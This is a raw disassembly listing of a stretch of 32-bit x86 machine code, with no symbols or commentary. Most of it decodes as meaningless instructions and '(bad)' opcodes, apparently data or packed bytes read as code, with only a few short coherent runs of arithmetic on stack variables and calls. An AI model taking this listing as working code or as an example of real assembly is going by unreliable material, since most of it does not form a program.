  412aee:	jp     0x412a72
  412af0:	mov    ch,0xe3
  412af2:	pop    eax
  412af3:	sti    
  412af4:	shl    DWORD PTR [ecx-0x16],0x66
  412af8:	pop    esi
  412af9:	(bad)  
  412afb:	jg     0x412af2
  412afd:	cld    
  412afe:	gs pop ebx
  412b00:	sbb    DWORD PTR [ecx+0x24],esi
  412b03:	es xchg ebp,eax
  412b05:	mov    ds:0x9f565326,eax
  412b0a:	outs   dx,BYTE PTR ds:[si]
  412b0c:	sbb    al,BYTE PTR [eax+0x58]
  412b0f:	sbb    ch,BYTE PTR [ebx+0x3d]
  412b12:	mov    cl,0xd0
  412b14:	inc    edx
  412b15:	test   al,0xcb
  412b17:	iret   
  412b18:	aas    
  412b19:	cs cmp al,0x63
  412b1c:	fisttp QWORD PTR [ebx+0x43619f89]
  412b22:	test   al,0x83
  412b24:	clc    
  412b25:	push   eax
  412b26:	xor    al,0x2b
  412b28:	mov    esp,0x5bf7782
  412b2e:	and    ebx,DWORD PTR [ecx-0x7]
  412b31:	cmp    eax,0xe36abf35
  412b36:	cmp    eax,DWORD PTR [ebx-0x60]
  412b39:	loopne 0x412ade
  412b3b:	xchg   edi,eax
  412b3c:	push   esp
  412b3d:	fimul  DWORD PTR [ecx-0x6b]
  412b40:	xlat   BYTE PTR ds:[ebx]
  412b41:	int3   
  412b42:	jbe    0x412af2
  412b44:	arpl   cx,bx
  412b46:	xchg   BYTE PTR [esi-0xe],bl
  412b49:	loope  0x412b52
  412b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b4c:	mov    DWORD PTR [ebx-0x3a90c30c],ecx
  412b52:	retf   
  412b53:	retf   0x3847
  412b56:	and    BYTE PTR [ebx+0x35],cl
  412b59:	dec    esi
  412b5a:	cmp    ebx,DWORD PTR [edx+0x3d105f1a]
  412b60:	bound  ebp,QWORD PTR [edi-0xa6db6fd]
  412b66:	mov    dl,0xef
  412b68:	xor    eax,0xce3b6bdd
  412b6d:	sbb    ecx,DWORD PTR [ebx-0x7]
  412b70:	shr    BYTE PTR [edx],1
  412b72:	test   eax,0xb9b0dbbd
  412b77:	mov    al,ds:0xd6754e68
  412b7c:	sbb    DWORD PTR [ebx+esi*4+0x1c],edx
  412b80:	(bad)  [ecx-0x1015c8a6]
  412b86:	sub    eax,0x933fd202
  412b8b:	mov    ebp,0xa0bc888a
  412b90:	fisttp DWORD PTR ss:[ecx]
  412b93:	push   ss
  412b94:	adc    ecx,DWORD PTR [ecx-0x41a9d16c]
  412b9a:	ret    
  412b9b:	out    dx,eax
  412b9c:	cdq    
  412b9d:	dec    edi
  412b9e:	add    cl,BYTE PTR [eax+0x46]
  412ba1:	pop    es
  412ba2:	jbe    0x412b51
  412ba4:	aad    0x8a
  412ba6:	inc    esp
  412ba7:	push   esi
  412ba8:	(bad)  
  412ba9:	popa   
  412baa:	mov    ch,0x96
  412bac:	sub    eax,DWORD PTR [esi]
  412bae:	cmp    al,0x56
  412bb0:	or     cl,BYTE PTR [eax+0x1b]
  412bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bb4:	push   0x7b14609f
  412bb9:	cmp    dl,ah
  412bbb:	lock fnstenv [edx-0x54]
  412bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bc0:	mov    eax,eax
  412bc2:	mov    eax,fs
  412bc4:	loopne 0x412c1f
  412bc6:	je     0x412bae
  412bc8:	jmp    0xc1a6af77
  412bcd:	add    ah,BYTE PTR [edx+eiz*1]
  412bd0:	mov    cl,0x3c
  412bd2:	mov    edx,0x3bf30a9c
  412bd7:	xor    DWORD PTR [edi+edx*4+0x4414eefb],edi
  412bde:	sub    esi,DWORD PTR [ebx+edx*8]
  412be1:	mov    ebp,0xd6ba77a2
  412be6:	sub    BYTE PTR [eax+edx*1-0x25],cl
  412bea:	push   ds
  412beb:	pop    esi
  412bec:	test   BYTE PTR [ebx-0x359e60ce],bl
  412bf2:	or     cl,BYTE PTR [eax-0x42473819]
  412bf8:	loop   0x412ba4
  412bfa:	xchg   esp,eax
  412bfb:	mov    eax,ds:0xec92f4d7
  412c00:	add    eax,0x6a6c10b3
  412c05:	inc    ebx
  412c06:	xchg   esi,eax
  412c07:	(bad)  [ebx]
  412c09:	hlt    
  412c0a:	xor    edx,edx
  412c0c:	push   cs
  412c0d:	mov    dl,0x99
  412c0f:	pop    edx
  412c10:	dec    esi
  412c11:	inc    ecx
  412c12:	out    dx,al
  412c13:	mov    ecx,ecx
  412c15:	imul   edx,DWORD PTR [ecx],0x15aaa8ad
  412c1b:	sti    
  412c1c:	cmp    DWORD PTR [esi+ecx*2],eax
  412c1f:	xchg   esp,eax
  412c20:	cwde   
  412c21:	rol    DWORD PTR [eax],0xbb
  412c24:	in     eax,dx
  412c25:	rcr    cl,0xb9
  412c28:	loopne 0x412c24
  412c2a:	pop    ecx
  412c2b:	add    BYTE PTR [ecx+ecx*1],0x7d
  412c2f:	xor    DWORD PTR [edx+0x755d6aff],0x65
  412c36:	retf   0x656b
  412c39:	mov    ds:0xcf515e5f,al
  412c3e:	jo     0x412c78
  412c40:	and    DWORD PTR [ebx],ecx
  412c42:	sub    esi,DWORD PTR [eax]
  412c44:	mov    bh,0x57
  412c46:	lock cld 
  412c48:	repz and al,0xef
  412c4b:	push   0x5e
  412c4d:	pavgb  mm0,QWORD PTR [eax+0x19]
  412c51:	(bad)  
  412c52:	cmp    eax,0xcd524f8b
  412c57:	xor    BYTE PTR [ebp+0x1a235a3f],0x68
  412c5e:	push   ds
  412c5f:	in     eax,0x6
  412c61:	push   0xffffffde
  412c63:	jle    0x412be6
  412c65:	loope  0x412c1b
  412c67:	or     DWORD PTR ds:0xc06cb5db,edi
  412c6d:	mov    eax,DWORD PTR [ebp-0x8]
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0xb0b142da
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [eax-0x47],bh
  412caf:	outs   dx,BYTE PTR ds:[esi]
  412cb0:	xor    DWORD PTR [ecx-0x61d330fd],ebp
  412cb6:	scas   eax,DWORD PTR es:[edi]
  412cb7:	mov    DWORD PTR [esi],edx
  412cb9:	(bad)  
  412cba:	pop    ebx
  412cbb:	imul   ebp,DWORD PTR [edx],0x66
  412cbe:	and    dl,BYTE PTR [ebp+edi*2-0x1628db67]
  412cc5:	dec    eax
  412cc6:	pop    es
  412cc7:	test   al,0xb9
  412cc9:	loopne 0x412cbc
  412ccb:	ret    
  412ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ccd:	add    eax,0x5f160bf4
  412cd2:	inc    edi
  412cd3:	push   ecx
  412cd4:	jb     0x412caf
  412cd6:	mov    al,ds:0x39955a0
  412cdb:	pushf  
  412cdc:	icebp  
  412cdd:	loop   0x412c67
  412cdf:	ja     0x412ccc
  412ce1:	sub    edx,DWORD PTR [edx]
  412ce3:	pusha  
  412ce4:	mov    ds:0x941f760e,eax
  412ce9:	cmc    
  412cea:	xchg   ebp,eax
  412ceb:	pushf  
  412cec:	push   edi
  412ced:	stc    
  412cee:	adc    BYTE PTR [ecx],al
  412cf0:	xchg   ebx,eax
  412cf1:	ja     0x412d61
  412cf3:	push   0x76
  412cf5:	sbb    eax,0xb52f36e7
  412cfa:	test   al,0xde
  412cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cfd:	adc    esp,esp
  412cff:	push   esp
  412d00:	jbe    0x412d6f
  412d02:	out    0xfd,eax
  412d04:	hlt    
  412d05:	add    DWORD PTR [ebp+0x29701899],edx
  412d0b:	pop    ecx
  412d0c:	mul    BYTE PTR [esi+0xc]
  412d0f:	ret    
  412d10:	pop    eax
  412d11:	sub    eax,0x81841c91
  412d16:	loopne 0x412ce3
  412d18:	(bad)  
  412d1a:	xchg   BYTE PTR [esp+ecx*2],ch
  412d1d:	adc    edi,DWORD PTR [esi-0x47]
  412d20:	inc    ebx
  412d21:	es dec ebp
  412d23:	dec    esp
  412d24:	sbb    DWORD PTR ds:0xa16d1eac,0xa6805f05
  412d2e:	jnp    0x412d45
  412d30:	or     eax,0x6eed9bb4
  412d35:	and    BYTE PTR [edx-0x6e],bl
  412d38:	mov    dl,0x78
  412d3a:	aaa    
  412d3b:	loopne 0x412d97
  412d3d:	xchg   esp,eax
  412d3e:	or     al,BYTE PTR [ebx]
  412d40:	xor    eax,0x1668c14f
  412d45:	and    ecx,DWORD PTR [edx+0x2f]
  412d48:	xchg   BYTE PTR [esi+0x7c1c3e90],dh
  412d4e:	and    BYTE PTR [eax-0x5d952c6c],cl
  412d54:	or     al,ch
  412d56:	loop   0x412ce9
  412d58:	xor    DWORD PTR es:[edx-0x64],edx
  412d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d5d:	cli    
  412d5e:	mov    BYTE PTR ds:0x22e72e76,bl
  412d64:	scas   al,BYTE PTR es:[edi]
  412d65:	shr    BYTE PTR [ebx+edx*4],cl
  412d68:	aaa    
  412d69:	lods   al,BYTE PTR ds:[esi]
  412d6a:	leave  
  412d6b:	or     al,0xb6
  412d6d:	or     ebx,DWORD PTR [esi]
  412d6f:	pop    esi
  412d70:	pop    esi
  412d71:	sub    esp,DWORD PTR [edi+0x52fa6726]
  412d77:	mov    eax,DWORD PTR [eax]
  412d79:	int    0xda
  412d7b:	(bad)  
  412d7c:	or     BYTE PTR es:[edi-0x6e1b68c],al
  412d83:	leave  
  412d84:	aas    
  412d85:	fisttp WORD PTR [edi+eax*8]
  412d88:	adc    esp,ebx
  412d8a:	jae    0x412d4a
  412d8c:	add    dl,BYTE PTR [edx]
  412d8e:	not    DWORD PTR [eax]
  412d90:	sub    eax,0xd017f25f
  412d95:	jbe    0x412d2a
  412d97:	jne    0x412de0
  412d99:	jb     0x412d39
  412d9b:	inc    esi
  412d9c:	or     cl,BYTE PTR [esi]
  412d9e:	cwde   
  412d9f:	test   DWORD PTR [edi],0x7fdc67c6
  412da5:	cmp    eax,0x6511e93c
  412daa:	dec    ecx
  412dab:	mov    ds:0xb860a644,eax
  412db0:	pushf  
  412db1:	mov    bl,0x92
  412db3:	mov    ebp,0x4c35d1
  412db8:	ds retf 0x21d7
  412dbc:	cmp    DWORD PTR [ebp-0x55],esi
  412dbf:	in     eax,0x3c
  412dc1:	or     DWORD PTR [eax],ebp
  412dc3:	jmp    0xfe9f1a92
  412dc8:	dec    edx
  412dc9:	stos   BYTE PTR es:[edi],al
  412dca:	dec    edi
  412dcb:	dec    ebx
  412dcc:	retf   0xc4da
  412dcf:	cdq    
  412dd0:	mov    ebp,0x3a224f59
  412dd5:	out    0x3d,eax
  412dd7:	xchg   DWORD PTR [ecx+0x1c65b50d],ebp
  412ddd:	jae    0x412dd2
  412ddf:	lods   al,BYTE PTR ds:[esi]
  412de0:	(bad)  
  412de1:	clc    
  412de2:	push   eax
  412de3:	xchg   DWORD PTR [edx+0x6e],ebp
  412de6:	adc    DWORD PTR [ecx+0x64],0x59
  412dea:	xor    ecx,DWORD PTR ss:[edi-0x64]
  412dee:	lods   al,BYTE PTR ds:[esi]
  412def:	into   
  412df0:	mov    edx,0x304672d4
  412df5:	call   0x548922dc
  412dfa:	sub    BYTE PTR [eax-0x7bced7c0],bl
  412e00:	cwde   
  412e01:	out    dx,eax
  412e02:	xchg   BYTE PTR [edx],bh
  412e04:	push   ds
  412e05:	mov    ebp,0x8d8da282
  412e0a:	in     al,0xeb
  412e0c:	cli    
  412e0d:	mov    ecx,0x2be893d1
  412e12:	(bad)  
  412e13:	mov    cl,0x76
  412e15:	dec    eax
  412e16:	or     ecx,DWORD PTR [eax+0x28]
  412e19:	add    DWORD PTR [ebx+0x35a2338c],edi
  412e1f:	cmp    DWORD PTR [edi],edx
  412e21:	mov    al,BYTE PTR [ebx+ecx*1-0x58]
  412e25:	mov    edi,0x10f67a29
  412e2a:	push   edx
  412e2b:	mov    ah,0xd
  412e2d:	adc    bl,BYTE PTR [edi+0x279c39ee]
  412e33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e34:	pop    edx
  412e35:	dec    eax
  412e36:	mov    esp,0xa3acb89c
  412e3b:	fwait
  412e3c:	outs   dx,BYTE PTR ds:[esi]
  412e3d:	out    dx,al
  412e3e:	stc    
  412e3f:	arpl   WORD PTR [esi],bx
  412e41:	test   DWORD PTR [ecx+0x7e1bff8f],edi
  412e47:	sbb    DWORD PTR [ebx+0x5be19739],esi
  412e4d:	adc    BYTE PTR [ebx],bl
  412e4f:	cwde   
  412e50:	sar    BYTE PTR [edi-0x759f65ec],1
  412e56:	inc    edi
  412e57:	pop    edx
  412e58:	dec    ecx
  412e59:	and    BYTE PTR [esi],0xf1
  412e5c:	cmp    BYTE PTR [edi-0x5bb77bf1],0x3d
  412e63:	repnz xchg ecx,eax
  412e65:	fstp   st(2)
  412e67:	dec    eax
  412e68:	inc    ebp
  412e69:	ficomp DWORD PTR [ecx+0x20]
  412e6c:	inc    ebp
  412e6d:	mov    BYTE PTR [esi-0x49818445],bl
  412e73:	jb     0x412e3f
  412e75:	(bad)  [edi+0x5]
  412e78:	sahf   
  412e79:	mov    eax,ds:0x3b2ae3
  412e7e:	pop    edi
  412e7f:	xchg   esi,eax
  412e80:	jp     0x412ed5
  412e82:	lock xlat BYTE PTR ds:[ebx]
  412e84:	inc    ebp
  412e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e86:	imul   ebp,DWORD PTR [eax-0x46d3cb1e],0x863e237c
  412e90:	fmul   DWORD PTR [eax-0x18]
  412e93:	fmulp  st(1),st
  412e95:	mov    al,ds:0x2962d872
  412e9a:	frstor [ebx]
  412e9c:	mov    bl,0x66
  412e9e:	aam    0xd2
  412ea0:	out    0xeb,al
  412ea2:	cmp    al,0x44
  412ea4:	jge    0x412e7f
  412ea6:	ja     0x412e30
  412ea8:	lods   eax,DWORD PTR ds:[esi]
  412ea9:	xor    bh,0xf6
  412eac:	scas   eax,DWORD PTR es:[edi]
  412ead:	jno    0x412e81
  412eaf:	mov    ch,0xc9
  412eb1:	(bad)  
  412eb2:	in     al,0x82
  412eb4:	cmc    
  412eb5:	sub    bh,bh
  412eb7:	xchg   edx,eax
  412eb8:	aas    
  412eb9:	adc    al,0x91
  412ebb:	and    eax,0x7cc8e931
  412ec0:	fs jno 0x412ea8
  412ec3:	hlt    
  412ec4:	mov    cl,0x59
  412ec6:	push   es
  412ec7:	icebp  
  412ec8:	sbb    al,0x3f
  412eca:	or     DWORD PTR [ebx+0x70],edx
  412ecd:	test   eax,0x428a151b
  412ed2:	pop    eax
  412ed3:	hlt    
  412ed4:	test   eax,eax
  412ed6:	jo     0x412e71
  412ed8:	in     eax,0xf8
  412eda:	retf   
  412edb:	je     0x412e83
  412edd:	lahf   
  412ede:	push   edx
  412edf:	xor    al,0x80
  412ee1:	fs inc edi
  412ee3:	mov    ecx,0xabb8453f
  412ee8:	test   BYTE PTR [esi-0x17],al
  412eeb:	lock jge 0x412ead
  412eee:	in     al,0x63
  412ef0:	div    DWORD PTR [ebx+0x4e]
  412ef3:	pop    esi
  412ef4:	out    0xf5,eax
  412ef6:	lahf   
  412ef7:	xchg   ebx,eax
  412ef8:	cmp    cl,al
  412efa:	popf   
  412efb:	cld    
  412efc:	rcl    dl,cl
  412efe:	push   esp
  412eff:	adc    ch,BYTE PTR [esi]
  412f01:	(bad)  
  412f02:	aad    0xa4
  412f04:	and    al,0x36
  412f06:	mov    bh,BYTE PTR [ebx+0x19ff355a]
  412f0c:	push   ds
  412f0d:	adc    esp,DWORD PTR [ebp+0x3472d880]
  412f13:	mov    bl,0x7a
  412f15:	stos   BYTE PTR es:[edi],al
  412f16:	(bad)  
  412f18:	or     al,0x0
  412f1a:	mov    ebp,0xe58e17c4
  412f1f:	add    BYTE PTR [esp+ebp*2-0x5ad64757],0xdf
  412f27:	scas   eax,DWORD PTR es:[edi]
  412f28:	pushf  
  412f29:	ja     0x412f2d
  412f2b:	das    
  412f2c:	outs   dx,DWORD PTR ds:[esi]
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	and    BYTE PTR [ebp+ecx*1+0x21],0x20
  412f33:	push   ss
  412f34:	ins    DWORD PTR es:[edi],dx
  412f35:	lahf   
  412f36:	push   ss
  412f37:	js     0x412f69
  412f39:	sub    al,0xaa
  412f3b:	cmp    bh,BYTE PTR cs:[eax+eiz*8-0x46ae852b]
  412f43:	jle    0x412ed6
  412f45:	ret    
  412f46:	es jnp 0x412f6e
  412f49:	outs   dx,DWORD PTR ds:[esi]
  412f4a:	out    dx,al
  412f4b:	or     bh,bl
  412f4d:	in     al,dx
  412f4e:	mov    edx,0x3fd6e1e6
  412f53:	or     al,BYTE PTR [edi]
  412f55:	sbb    eax,0x397709fe
  412f5a:	dec    eax
  412f5b:	inc    edx
  412f5c:	adc    ch,BYTE PTR [esi-0x40]
  412f5f:	outs   dx,DWORD PTR ds:[esi]
  412f60:	shl    DWORD PTR [esi+0x12bd8af5],1
  412f66:	iret   
  412f67:	inc    eax
  412f68:	jmp    0xa4c3355f
  412f6d:	loope  0x412f6c
  412f6f:	cmp    al,0x65
  412f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f72:	test   DWORD PTR [edi-0x23],ebp
  412f75:	aaa    
  412f76:	js     0x412f15
  412f78:	jge    0x412ff1
  412f7a:	lods   al,BYTE PTR ds:[esi]
  412f7b:	xchg   esi,eax
  412f7c:	data16 hlt 
  412f7e:	cmc    
  412f7f:	std    
  412f80:	sti    
  412f81:	adc    DWORD PTR [edx],edi
  412f83:	int3   
  412f84:	push   ds
  412f85:	test   esi,edi
  412f87:	test   DWORD PTR [eax-0x2b],edx
  412f8a:	enter  0x9f90,0x5d
  412f8e:	or     al,0xca
  412f90:	repz fs mov esi,0xba495328
  412f97:	es cmp al,0x36
  412f9a:	push   edx
  412f9b:	mov    eax,0xd4f00bb7
  412fa0:	aam    0xc8
  412fa2:	pop    edx
  412fa3:	mov    WORD PTR [ebx],?
  412fa5:	mov    ds:0x524dc448,al
  412faa:	sub    esi,DWORD PTR [edi]
  412fac:	je     0x412fde
  412fae:	in     eax,dx
  412faf:	pop    edx
  412fb0:	retf   
  412fb1:	popa   
  412fb2:	pop    ecx
  412fb3:	mov    eax,ds:0xccb174e0
  412fb8:	pop    ebp
  412fb9:	ret    0xd126
  412fbc:	adc    eax,0x7abd781a
  412fc1:	lods   eax,DWORD PTR ds:[esi]
  412fc2:	dec    ebp
  412fc3:	les    ebp,FWORD PTR [ebp+ebp*4-0x1fab400b]
  412fca:	sahf   
  412fcb:	mov    esi,0xe18bd68a
  412fd0:	cmp    BYTE PTR [ecx+0x33],cl
  412fd3:	sar    BYTE PTR [esp+ecx*4-0x7eaf253],0x3a
  412fdb:	ror    DWORD PTR [ebx-0x6c],cl
  412fde:	mov    ch,BYTE PTR [ebx+0x5e21d270]
  412fe4:	scas   al,BYTE PTR es:[edi]
  412fe5:	mov    ebp,gs
  412fe7:	or     WORD PTR [ebp-0xa765428],dx
  412fee:	inc    ecx
  412fef:	stos   DWORD PTR es:[edi],eax
  412ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ff1:	pop    edx
  412ff2:	lea    eax,[edx-0x4baaeac]
  412ff8:	sbb    ch,dh
  412ffa:	xor    edx,ebx
  412ffc:	out    0xe0,eax
  412ffe:	pusha  
  412fff:	xor    al,0x78
  413001:	fistp  DWORD PTR [ebx+0x66]
  413004:	and    DWORD PTR [ebx],0x87b05f8c
  41300a:	jbe    0x413062
  41300c:	sbb    eax,0x5ad4d5d3
  413011:	mov    ecx,0x2ea0f906
  413016:	adc    dl,ch
  413018:	xchg   edi,eax
  413019:	jbe    0x41302f
  41301b:	pop    ecx
  41301c:	sub    edx,edx
  41301e:	cmp    DWORD PTR [ebx+0x7a],0x95979c9e
  413025:	dec    ecx
  413026:	xchg   edi,eax
  413027:	adc    BYTE PTR [ebx],bl
  413029:	mov    ds:0xcd30cf44,eax
  41302e:	fadd   QWORD PTR [bp+di-0xa]
  413032:	(bad)  
  413033:	clc    
  413034:	rol    BYTE PTR [eax-0x38],cl
  413037:	xchg   edi,eax
  413038:	xchg   esp,eax
  413039:	ss jmp 0x3214:0x906b396f
  413041:	out    dx,al
  413042:	mov    eax,ebx
  413044:	mov    edi,0x3e7b180
  413049:	adc    cl,BYTE PTR [ebx-0x26931993]
  41304f:	fidivr DWORD PTR [ecx+edx*1-0x1caf288d]
  413056:	shl    DWORD PTR [esi+ecx*8-0x16693f50],0xb1
  41305e:	ret    0x32d8
  413061:	add    DWORD PTR [eax],edx
  413063:	xchg   ecx,eax
  413064:	mov    eax,ds:0x51430dfa
  413069:	push   eax
  41306a:	call   0x422074
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [eax+esi*4+0x6d],edi
  4130e0:	push   ecx
  4130e1:	jle    0x4130b6
  4130e3:	dec    eax
  4130e4:	sbb    BYTE PTR [eax],bl
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    BYTE PTR [edi],bl
  4130eb:	nop
  4130ec:	jmp    0xf2b8:0x5ba700f7
  4130f3:	mov    ecx,esp
  4130f5:	inc    ecx
  4130f6:	dec    edi
  4130f7:	mov    dh,BYTE PTR [ecx+0x18]
  4130fa:	sub    al,0x47
  4130fc:	cmp    esp,edx
  4130fe:	dec    edx
  4130ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413100:	or     BYTE PTR [ebx+0x1b],cl
  413103:	inc    edi
  413104:	xchg   DWORD PTR [ebp-0x17],esi
  413107:	or     DWORD PTR [ebp-0x31],ebx
  41310a:	push   es
  41310b:	mov    bh,cl
  41310d:	ins    DWORD PTR es:[edi],dx
  41310e:	mov    ebp,0xd9c0f7c4
  413113:	ds dec ebp
  413115:	inc    edx
  413116:	and    eax,0xcd8c5a40
  41311b:	add    eax,DWORD PTR [esi]
  41311d:	add    ecx,ebx
  41311f:	shr    DWORD PTR [edi],cl
  413121:	out    dx,al
  413122:	mov    ecx,0x6676d46d
  413127:	xchg   DWORD PTR [edi],ecx
  413129:	inc    eax
  41312a:	in     al,0xce
  41312c:	cdq    
  41312d:	xor    eax,0xfcc76838
  413132:	ja     0x4130f0
  413134:	cs retf 
  413136:	xor    eax,0xa3d9edab
  41313b:	adc    eax,0x41301c12
  413140:	(bad)  
  413141:	mov    ah,0xed
  413143:	loopne 0x41316c
  413145:	pushf  
  413146:	inc    edx
  413147:	ss push ebx
  413149:	sbb    DWORD PTR [ebp+0x11],edx
  41314c:	fisttp QWORD PTR [edi]
  41314e:	jno    0x4130ef
  413150:	fld    QWORD PTR [ebx+0x1f]
  413153:	xchg   edx,eax
  413154:	mov    eax,ds:0xe3ab5f5
  413159:	sbb    al,0x90
  41315b:	cdq    
  41315c:	mov    ecx,0xdca66b1a
  413161:	xchg   ecx,ecx
  413163:	xor    eax,0xab12ca03
  413168:	mov    al,ds:0x6424ca08
  41316d:	jae    0x41312e
  41316f:	mov    BYTE PTR ds:0xf8f8cf41,dl
  413175:	fmul   QWORD PTR [ecx]
  413177:	rol    DWORD PTR [ebx],0xc6
  41317a:	jno    0x41317e
  41317c:	xchg   ebp,eax
  41317d:	pop    edi
  41317e:	mov    bh,ah
  413180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413181:	lahf   
  413182:	test   al,0x95
  413184:	sub    BYTE PTR [ecx+0x5154d6b0],0x7e
  41318b:	sbb    al,0x8
  41318d:	test   al,0xe5
  41318f:	xchg   esi,eax
  413190:	cmp    BYTE PTR ds:[eax],0x54
  413194:	jmp    0x5a0d:0xb1b37bdb
  41319b:	fidiv  DWORD PTR [edi-0x16]
  41319e:	shr    DWORD PTR [edi+0x27bcb46f],0x9e
  4131a5:	inc    esi
  4131a6:	popa   
  4131a7:	pop    ecx
  4131a8:	or     eax,0x1bad4548
  4131ad:	xchg   esi,eax
  4131ae:	cmp    ah,BYTE PTR [ecx+0x9]
  4131b1:	mov    esp,0x7aa232cf
  4131b6:	push   esi
  4131b7:	fsub   DWORD PTR ds:0x921a01ca
  4131bd:	push   ds
  4131be:	xchg   BYTE PTR [ebx-0x11],ch
  4131c1:	cmp    DWORD PTR [edx-0x34],0x9bdfa5ce
  4131c8:	push   esp
  4131c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131ca:	cmc    
  4131cb:	adc    eax,0x60748605
  4131d0:	popa   
  4131d1:	dec    ebx
  4131d2:	add    ebx,ecx
  4131d4:	fwait
  4131d5:	cmp    eax,0x747afdb1
  4131da:	in     al,0x30
  4131dc:	or     DWORD PTR [ecx],eax
  4131de:	mov    edx,0xb708e337
  4131e3:	stos   DWORD PTR es:[edi],eax
  4131e4:	ds push es
  4131e6:	scas   eax,DWORD PTR es:[edi]
  4131e7:	retf   0xb74c
  4131ea:	daa    
  4131eb:	arpl   WORD PTR [ebp+0x20841da9],bp
  4131f1:	std    
  4131f2:	mov    dh,BYTE PTR [esi+0x61]
  4131f5:	jne    0x413260
  4131f7:	sar    DWORD PTR [ebx+0x4],1
  4131fa:	sar    BYTE PTR [ecx-0x3e689b32],cl
  413200:	out    0x9d,al
  413202:	jnp    0x41318d
  413204:	popf   
  413205:	retf   0xdab6
  413208:	aam    0xce
  41320a:	mov    cl,BYTE PTR [esi-0x1f]
  41320d:	xchg   edi,eax
  41320e:	or     dh,bh
  413210:	mov    cl,0x78
  413212:	add    BYTE PTR [eax-0x61c935ab],cl
  413218:	popf   
  413219:	neg    DWORD PTR ds:0x5310b9cf
  41321f:	pop    eax
  413220:	mov    ds,eax
  413222:	out    dx,al
  413223:	jno    0x413272
  413225:	in     al,0x4f
  413227:	xor    al,0xb9
  413229:	sar    DWORD PTR [edi-0x3],0x9a
  41322d:	mov    al,0x37
  41322f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413230:	dec    ecx
  413231:	ins    DWORD PTR es:[edi],dx
  413232:	enter  0x92c1,0xcc
  413236:	adc    dl,BYTE PTR [edx-0x5d]
  413239:	mov    ebp,0xfe75a487
  41323e:	sbb    eax,DWORD PTR [esi]
  413240:	or     dh,BYTE PTR [eax+0x275cc906]
  413246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413247:	fisub  WORD PTR [ebp-0x158aca6d]
  41324d:	ins    DWORD PTR es:[edi],dx
  41324e:	jecxz  0x4131f9
  413250:	aam    0x6c
  413252:	lds    ebp,FWORD PTR [edx]
  413254:	mov    esp,0x3272cc9e
  413259:	test   eax,0x3f3579af
  41325e:	(bad)  
  41325f:	add    ebp,DWORD PTR [esi+0x1d63c5f1]
  413265:	dec    ebx
  413266:	sub    esi,esi
  413268:	repnz add DWORD PTR [edx],ebp
  41326b:	mov    ch,0x65
  41326d:	sub    al,0x84
  41326f:	rol    BYTE PTR [edx+0x1cf7e379],cl
  413275:	dec    esp
  413276:	gs push 0x472e0b40
  41327c:	das    
  41327d:	push   ds
  41327e:	dec    esi
  41327f:	inc    ecx
  413280:	mov    BYTE PTR [edx+edi*2-0x5e],dl
  413284:	fdivr  QWORD PTR [ebx]
  413286:	arpl   WORD PTR [ecx-0x57],sp
  413289:	mov    ebx,0x6567e5ad
  41328e:	jl     0x41324d
  413290:	lahf   
  413291:	xor    ebx,DWORD PTR [edi-0x5e50bf6]
  413297:	dec    edi
  413298:	sar    BYTE PTR [eax+0x6b],0x42
  41329c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
